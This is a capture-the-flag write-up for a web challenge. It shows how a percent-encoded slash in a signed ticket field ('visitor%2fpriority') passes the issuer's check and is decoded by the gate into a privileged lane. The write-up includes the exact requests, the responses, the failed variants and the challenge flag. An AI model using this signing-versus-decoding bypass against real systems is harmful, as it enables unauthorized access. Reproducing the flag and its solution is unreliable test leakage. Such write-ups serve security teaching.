# The Queue Is a Mobius Strip — Web

> Waterfront Queue. Use `/issue?name=guest&lane=visitor` and present the ticket at
> `/gate?ticket=...`. Kiosk labels are signed as received. The gate normalizes the saved label
> before routing.
> `http://45.77.247.35:22008`

**Flag:** `CYBLTZ2026{d0ubL3_d3c0d3_5k1pp3d_7h3_l1n3}`

A classic parser-differential: the component that **signs** the lane and the component that
**routes** on it disagree about what the lane string is.

## The ticket

`/issue` hands back a JWT-shaped token — base64url payload, a dot, and an HMAC:

```
GET /issue?name=guest&lane=visitor
{"ticket":"eyJuYW1lIjoiZ3Vlc3QiLCJsYW5lIjoidmlzaXRvciJ9.hLgiUovCw_5wqCGblFJFIivOkXEjFxz8kwIgyXfAVhM",
 "kiosk_lane":"visitor"}
```

The payload decodes to `{"name":"guest","lane":"visitor"}`. The HMAC key is not recoverable, so
the lane that gets signed must be one `/issue` is willing to produce.

## The lane board and the restriction

```
GET /lanes -> {"visitor":"open", "visitor/express":"retired", "visitor/priority":"open"}
```

`visitor/priority` is the target, but `/issue` refuses to sign it:

```
/issue?lane=priority          -> only visitor lanes without path separators are issued publicly
/issue?lane=visitor/priority  -> only visitor lanes without path separators are issued publicly
```

So the issuer's rule is: *must start with `visitor`, must not contain `/`*.

## The differential

"The gate **normalizes** the saved label before routing" is the whole challenge. The gate
**URL-decodes** the lane again before it routes. So if I feed the issuer a lane that contains a
percent-encoded slash, the issuer sees no literal `/` (passes its check) and signs it verbatim;
the gate then decodes `%2f` → `/` and routes to the privileged lane:

```
GET /issue?name=guest&lane=visitor%2fpriority
{"ticket":"...","kiosk_lane":"visitor%2fpriority"}     # issuer signed the literal %2f
```

Present it:

```
GET /gate?ticket=<that ticket>
{"name":"guest","gate_lane":"visitor/priority","admitted":true,
 "flag":"CYBLTZ2026{d0ubL3_d3c0d3_5k1pp3d_7h3_l1n3}"}
```

## What didn't work (and why)

- **Unicode fold** — `visitor／priority` (U+FF0F fullwidth solidus). The gate does *not* apply
  NFKC; `gate_lane` echoed the raw fullwidth char and `admitted:false`.
- **Backslash** `visitor\priority`, **double-encode** `visitor%252fpriority`, **traversal**
  `visitor%2f..%2fpriority` — all routed to the literal (non-existent) lane, `admitted:false`.

Only a *single* extra decode at the gate (`%2f` → `/`) crosses the boundary — hence
`d0ubL3_d3c0d3`.

**Takeaway:** sign the exact bytes you route on. Any canonicalization (decode, normalize,
lowercase, trim) performed *after* signature verification re-opens the gap the signature was
supposed to close.
